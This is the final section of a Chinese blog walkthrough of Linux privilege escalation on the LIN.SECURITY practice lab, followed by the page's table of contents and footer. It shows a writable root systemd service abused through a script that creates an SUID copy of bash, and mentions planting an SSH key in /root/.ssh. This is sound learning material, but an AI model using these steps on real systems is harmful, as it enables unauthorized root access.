+<h3 id="靶机提权演示-1"><a href="#靶机提权演示-1" class="headerlink" title="靶机提权演示"></a>靶机提权演示</h3><p>查看<code>peter</code>用户的<code>systemd</code>配置，发现<code>peter</code>这个用户拥有<code>debug.service</code>文件，并且他<strong>对这个文件拥有读和写的权限</strong>。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222154157.png" alt></p>
+<p>如果服务器存在缺陷，<strong>可以被覆盖或者修改文件</strong>，可以通过<strong>修改低权限用户有权访问的<code>.service</code>文件并更改<code>run()</code>命令来将其转换为代码执行</strong>。重新启动服务时，将运行攻击者的命令。</p>
+<p>查看<code>.service</code>文件，这里我们可以修改<code>ExecStart</code>文件，除此之外还可以修改<code>ExecStop</code>和<code>ExecReload</code>来在<strong>停止</strong>和<strong>重启</strong>服务时执行命令。</p>
+<p>查看该<code>.service</code>文件：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222155806.png" alt></p>
+<p><code>ExecStart</code>为<code>/root/debug</code>，这是一个<strong>二进制服务</strong>并且该服务<strong>以root身份运行</strong>。</p>
+<p>接下来为了利用，使用一个<strong>类似ssh可以sudo执行的方法</strong>。</p>
+<p><strong>让root身份来创建一个systemdexpl.sh脚本</strong>，将<code>/bin/bash</code>文件<strong>复制到</strong><code>systemdbash</code><strong>并设置一个SUID位</strong>并且赋予执行权限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">'#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash'</span> &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br></pre></td></tr></table></figure>
+<p><code>-e</code>参数为显示换行。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160028.png" alt></p>
+<p>修改<code>debug.service</code>文件来调用我们的脚本（记住<strong>root调用debug.service</strong>，而<strong>debug.service又调用我们的systemdexpl.sh脚本</strong>）修改<code>ExecStart</code>为当前脚本。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160305.png" alt></p>
+<p>而要调用这个服务并且启动，就是<strong>重新开启会话（可能重启系统）</strong>，<strong>利用SUID来进行提权</strong>。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222160857.png" alt></p>
+<p>利用<code>SUID</code>提权：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222161005.png" alt></p>
+<p>同理，<strong>root调用debug.service</strong>，而<strong>debug.service又调用我们的systemdexpl.sh脚本</strong>，我们可以将<code>systemdexpl.sh</code>的内容修改为将公钥写入<code>/root/.ssh</code>下：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222162107.png" alt></p>
+<p>直接以<code>root</code>用户登录：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200222162207.png" alt></p>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#靶机设置"><span class="toc-text">靶机设置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修改默认键盘布局"><span class="toc-text">修改默认键盘布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配置网卡"><span class="toc-text">配置网卡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单信息搜集"><span class="toc-text">简单信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测当前用户权限"><span class="toc-text">检测当前用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看系统的发行版本和内核版本"><span class="toc-text">查看系统的发行版本和内核版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看运行的服务及安装的程序"><span class="toc-text">查看运行的服务及安装的程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-sudo-提权"><span class="toc-text">1. sudo  提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-etc-passwd的哈希"><span class="toc-text">2. /etc/passwd的哈希</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-passwd"><span class="toc-text">/etc/passwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-shadow"><span class="toc-text">/etc/shadow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#靶机提权演示"><span class="toc-text">靶机提权演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#破解用户密码hash的常用工具和方法"><span class="toc-text">破解用户密码hash的常用工具和方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#在线网站查询"><span class="toc-text">在线网站查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#工具"><span class="toc-text">工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-利用定时任务cron以及通配符"><span class="toc-text">3. 利用定时任务cron以及通配符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用隐藏文件"><span class="toc-text">4. 利用隐藏文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-利用SUID"><span class="toc-text">5. 利用SUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-NFS低权限访问"><span class="toc-text">6. NFS低权限访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-利用docker组提权"><span class="toc-text">7. 利用docker组提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-systemd配置"><span class="toc-text">8. systemd配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#systemd是什么"><span class="toc-text">systemd是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#靶机提权演示-1"><span class="toc-text">靶机提权演示</span></a></li></ol></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: FengHLZ</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2020-02-22-提权知识学习-LIN-SECURITY靶场/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+      <div class="site-comment-contanier">
+  <p id="site-comment-info">
+    <i class="fa fa-spinner fa-spin"></i> 评论加载中
+  </p>
+  <div id="site-comment">
+  </div>
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">博客推荐</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://xin-tan.com/" target="_blank">GodBMW</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">书签</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://leancloud.cn/" target="_blank">LeanCloud</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">在线工具</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://www.ilovepdf.com/zh-cn" target="_blank">iLovePDF</a>
+          </span>
+        
+          <span class="site-footer-item">
+            <a href="https://www.iloveimg.com/zh-cn" target="_blank">iLoveIMG</a>
+          </span>
+        
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 2362929771@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content" style="height:55%;width:40%;">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control"/>
+      </div>
+      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+        
+          <div>
+            <img src="/images/wechatpay.png" alt="WeChat">
+            
+              <p>WeChat</p>
+            
+          </div>
+        
+          <div>
+            <img src="/images/alipay.jpg" alt="AliPay">
+            
+              <p>AliPay</p>
+            
+          </div>
+        
+      </div>
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+    <div id="local-search-result" style="height:50%;display:none;"></div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div></div>
+  <div class="bottom-bar-left">
+    <a href="javascript:void(0);" data-enable="false">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/passages/2020-02-12-信息搜集总结/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    <a href="javascript:void(0);" id="site-reward">
+      <i class="fa fa-thumbs-up"></i>
+    </a>
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-twitter"></i>
+    </a>
+  
+  
+    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-facebook"></i>
+    </a>
+  
+  
+    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-weibo"></i>
+    </a>
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+  <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+  <script async>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', '');
+  </script>
+
+
+
+  <script async>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+  </script>
+
+
+
+  <script async>
+    (function(){
+    var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?":"https://jspassport.ssl.qhimg.com/11.0.1.js?";
+    document.write('<script src="' + src + '" id="sozz"><\/script>');
+    })();
+  </script>
+
+
+  </body>
+</html>
